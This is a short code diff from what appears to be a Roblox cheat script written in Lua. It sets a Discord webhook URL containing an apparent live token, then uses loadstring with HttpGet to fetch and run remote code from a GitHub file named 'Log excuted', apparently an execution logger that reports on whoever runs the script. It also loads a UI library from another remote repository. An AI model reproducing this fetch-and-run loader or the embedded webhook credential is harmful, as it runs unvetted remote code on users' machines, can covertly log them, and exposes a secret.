@@ -17,7 +17,8 @@ getgenv().FooterUrl = "https://cdn.discordapp.com/attachments/122919331646210061
 
 getgenv().Webhook = "https://discord.com/api/webhooks/1230561768405995540/_suqjscEjVlg39bVW9ZgDDFf902z32AiRsbolEKOGjL0pjzkjn8djuy___4XWekelcy9"
 
-coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FOWscript/script/main/Log%20excuted"))()
+coroutine.wrap(function() 
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/FOWscript/script/main/Log%20excuted"))()
 end)()
 
 local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
